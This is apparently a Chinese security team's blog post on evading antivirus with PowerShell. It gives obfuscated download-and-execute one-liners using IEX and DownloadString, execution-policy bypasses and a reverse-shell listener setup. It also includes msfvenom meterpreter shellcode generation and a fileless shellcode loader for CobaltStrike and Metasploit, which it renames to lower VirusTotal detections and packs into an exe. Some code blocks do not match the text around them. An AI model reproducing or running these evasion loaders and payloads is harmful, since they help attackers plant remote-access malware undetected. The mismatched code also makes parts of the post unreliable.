> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/WDo04McAf4D9c2cvGlH1aA)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXu3bXekvbOVFvAicpfFJwIOcQOuakZ6jTmyNoeraLFgI4cibKrDRiaPAljUry4dy4e2zK8lUMyKfkGg/640?wx_fmt=png)前言

在之前发布的一篇 渗透技巧之 Powershell 实战思路中，学习了 powershell 在对抗 Anti-Virus 的方便和强大。团队免杀系列又有了远控免杀从入门到实践 (6)- 代码篇 - Powershell 更是拓宽了自己的认知。这里继续学习 powershell 在对抗 Anti-Virus 的骚姿势。

绕过执行策略

powershell 可以通过绕过执行策略来执行恶意程序。  
而从文件是否落地可以简单分为落地的 bypass、不落地的 bypass。  
以落地为例

```
powershell -ExecutionPolicy bypass -File  a.ps1
```

以不落地为例，如我们熟知的 IEX  

```
powershell  -c "IEX(New-Object Net.WebClient).DownloadString('http://xxx.xxx.xxx/a')"
```

从免杀上来说，查杀比较严格的当然是不落地文件的这种方式。  
我们可以将两种方式混用来实现简单的 bypass  
如：  

```
echo Invoke-Expression(new-object net.webclient).downloadstring('http://xxx.xxx.xxx/a') | powershell -
```

如：  

```
powershell -c "IEX(New-Object Net.WebClient).DownloadString('d://a')"
```

简单混淆  

-------

powershell 混淆姿势有很多，如字符串转换、变量转换、编码、压缩等等。根据 powershell 语言的特性来混淆代码，从而绕过 Anti-Virus。

### 处理 powershell

利用 cmd 的混淆以不同的姿势调用 powershell  
如利用 win10 环境变量截取出 powershell

```
%psmodulepath:~24,10%
```

### 处理 IEX  

为 IEX 设置别名

```
powershell set-alias -name cseroad -value Invoke-Expression;cseroad(New-Object Net.WebClient).DownloadString('http://xxx.xxx.xxx/a')
```

### 处理 downloadstring  

使用转义符

```
"Down`l`oadString"
```

### 处理 http

以变量的方式拆分 http

```
powershell "$a='((new-object net.webclient).downloadstring(''ht';$b='tp://109.xx.xx.xx/a''))';IEX ($a+$b)"
```

以中文单引号分割

```
ht‘+’tp
```

基于以上混淆基础，就可以实现多种 bypass 的姿势  
如：  

```
cmd /c "set p1=power&& set p2=shell&& cmd /c echo (New-Object Net.WebClient).DownloadString("http://109.xx.xx/a") ^|%p1%%p2% -"
```

如：  

```
echo Invoke-Expression (New-Object "NeT.WebClient")."Down`l`oadString"('h'+'ttp://106.xx.xx.xx/a') | powershell -
```

如：  

```
chcp 1200 & powershell  -c "IEX(New-Object Net.WebClient)."DownloadString"('ht‘+’tp://xx.xx.xx/a')"
```

这里再分享一个小技巧：  
在测试对抗某些杀毒软件时，发现对 cmd 下操作查杀比较严格，相对来说 powershell 环境下更容易 bypass。  
而实际中可能更多的默认为 cmd。我们可以先用 socket 一句话反弹 powershell 环境，再执行后续操作。  
客户端执行命令：  

```
nc -lvp 9090
```

服务端 nc 监听即可：

```
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("xxx"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

以此来迂回得达到我们的目的。   

分析 CobaltStrike powershell command
----------------------------------

这里使用 CobaltStrike 4.1 来生成 payload

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RVFU1jC0hU4qibdrwo6SianbnQVyEbHibpItCREyzIvPOtgrChbmPKBGpZ8uO8g5zXrzXdCoHolHK0Qw/640?wx_fmt=jpeg)

访问 83 端口的 a 文件，获取 payload 代码。  
查看代码，可以看到先使用 base64 解码一段字符串，又通过`IO.Compression.GzipStream`解压缩，并将代码进行 IEX 执行。

```
powershell -ExecutionPolicy bypass -File  aaaaa.ps1 >> old.txt
```

修改 IEX 为 echo，保存为 aaaa.ps1 文件，运行得到源码。

```
[Byte[]]$var_code = [System.IO.File]::ReadAllBytes('new.bin')
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RVFU1jC0hU4qibdrwo6SianbnMMzYlxYo3FAt3lay2R00NFjkJRslcJ4LDNJ8DMLicMHGUJ7dxrAqF9g/640?wx_fmt=jpeg)

可以看出大概分为`func_get_delegate_type`、`func_get_proc_address`两个函数，然后是一个 base64 解码的函数，且将 byte 数组进行了 xor 的异或操作。然后分配一些内存，将有效负载复制到分配的内存空间中。最后判断计算机架构并执行。

那么关键位置就应该是这串 base 编码的数据了。事实上，这段数据是 bin 文件编码得来的。  
我们将该 byte 数组保存为 new.bin 文件。

```
powershell -ExecutionPolicy bypass -File old.ps1 http://106.xx.xx.xx/payload.bin
```

而后修改为读取 new.bin 文件内容到内存后再上线。  
即

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.26 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 -o /var/www/html/shell.bin
```

其余代码未修改。

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RVFU1jC0hU4qibdrwo6Sianbny61XUmkV1B51hfKaCR7o5mswtj81hicLTFfARvHKqcPyQ15FYcV1kbg/640?wx_fmt=jpeg)

执行后可正常上线。  
放入 VT 查杀一下 11/59

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RVFU1jC0hU4qibdrwo6SianbnbcfY8k8iaCiad6xpoU9Pt6tT9gicqB8EdWVovzOTRHaJOuPGSEXsIDRKA/640?wx_fmt=jpeg)

这时候我们就得到了 powershell 版的一个加载器，继续尝试修改该加载器本身的一些特征。

> 对`func_get_delegate_type`，`func_get_proc_address`两个函数重命名替换，对函数里面的一些变量进行重新定义
> 
> 重命名`$DoIt`为`$aaaa`
> 
> 修改 IEX 为 I`EX
> 
> 修改 Invoke 为 Inv'+'oke
> 
> 替换`$var_code`为`$acode` 

放入 VT 再次查杀 2/58

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RVFU1jC0hU4qibdrwo6SianbnCQCvDG2jZb56vT8rT8V2aFunibbxlGJpHIJAkc8beJATrSKqdLkZbtw/640?wx_fmt=jpeg)

powershell 加载器
--------------

上面的脚本通过读取 new.bin 中的字节数组并在内存执行从而成功使 cobalt strike 上线。  
那同样可以从远程文件读取 shellcode，并加载到内存执行，来实现 payload 无落地。

加载器代码如下：

```
powershell -ExecutionPolicy bypass -File a.ps1 http://10.211.55.26/shell.bi
```

CobaltStrike 生成 payload.bin 文件时，注意勾选 x64。

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RVFU1jC0hU4qibdrwo6SianbnhmtzJic0bsbe9SRNpicXicVkQ2rBjvZb42p8xjSTxo6bMAcwXbREMqv3w/640?wx_fmt=jpeg)

将该 payload.bin 文件放置在远程服务器上，powershell 执行 bypass 操作。

```
powershell.exe -ExecutionPolicy bypass  -command "&'.\ps2exe.ps1' -inputFile 'old.ps1' -outputFile 'aaa.exe'"
```

CobaltStrike 正常上线。  

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RVFU1jC0hU4qibdrwo6SianbnIDJJeIembQhWeaYI4wswYVceh1kSefBMhuZNodC9oFL9kWdwLaicUEg/640?wx_fmt=jpeg)

metasploit 也是同样的道理。使用 msfvenom 生成 raw 文件，看看加载器是否通用。  
生成 raw 木马

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.26 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 -o /var/www/html/shell.bin
```

powershell 直接利用加载器加载该 bin 文件。

```
powershell -ExecutionPolicy bypass -File a.ps1 http://10.211.55.26/shell.bi
```

metasploit 也可以正常上线。  

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RVFU1jC0hU4qibdrwo6SianbnDnXgJPQicccmnUxaWyibBMIw0NOjROY2LpeyHudGLSv9RPM1AHmt2dlA/640?wx_fmt=jpeg)

powershell 转 exe
----------------

在修改了加载器之后，我们还可以通过 powershell 代码将其加载器转换为 exe 程序。  
借助 Win-PS2EXE 项目，通过 ps2exe.ps1 脚本将加载器转为 exe 文件。更方便实战中使用。

```
powershell.exe -ExecutionPolicy bypass  -command "&'.\ps2exe.ps1' -inputFile 'old.ps1' -outputFile 'aaa.exe'"
```

查杀率 5/70  

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RVFU1jC0hU4qibdrwo6SianbnWFIL4ibvsLQP5qAA2eylBhU67mRqI8ibaN6tqUpM2Swx7eALC8FzLQ2Q/640?wx_fmt=jpeg)

测试可过 360、火绒。

![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RVFU1jC0hU4qibdrwo6SianbnfbrXX2YTad3guyjcBliapoic3jTf40Y2hT9miccxgzwTibwWVy7mnF9dww/640?wx_fmt=jpeg)

总结
--

> 利用 cmd、powershell 语法混淆实现了 bypass；
> 
> 简单分析 CobaltStrike powershell payload 获得 powershell 版本的 shellcode 加载器；
> 
> 利用 Win-PS2EXE 项目转换为 exe 更方便实际利用。

参考资料
----

```
https://evi1.cn/post/powershell-bypass-2/
https://rootrain.me/2020/02/29/%E5%86%85%E7%BD%91%E9%98%B2%E5%BE%A1%E8%A7%84%E9%81%BF(%E4%BA%8C)-%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%B7%B7%E6%B7%86/#0x04-%E5%9E%83%E5%9C%BE%E5%88%86%E9%9A%94%E7%AC%A6
https://www.anquanke.com/post/id/86637
```

E

N

D

**关**

**于**

**我**

**们**

Tide 安全团队正式成立于 2019 年 1 月，是新潮信息旗下以互联网攻防技术研究为目标的安全团队，团队致力于分享高质量原创文章、开源安全工具、交流安全技术，研究方向覆盖网络攻防、系统安全、Web 安全、移动终端、安全开发、物联网 / 工控安全 / AI 安全等多个领域。

团队作为 “省级等保关键技术实验室” 先后与哈工大、齐鲁银行、聊城大学、交通学院等多个高校名企建立联合技术实验室，近三年来在网络安全技术方面开展研发项目 60 余项，获得各类自主知识产权 30 余项，省市级科技项目立项 20 余项，研究成果应用于产品核心技术研究、国家重点科技项目攻关、专业安全服务等。对安全感兴趣的小伙伴可以加入或关注我们。

![](https://mmbiz.qpic.cn/mmbiz_gif/rTicZ9Hibb6RX4MU7S4WB8R6vF3JbUjA7K0ZtOPxqGSo1HGPhTDicQibOro93UYNBOwRPd4EFseGTDsl1tan0ZXcmw/640?wx_fmt=gif)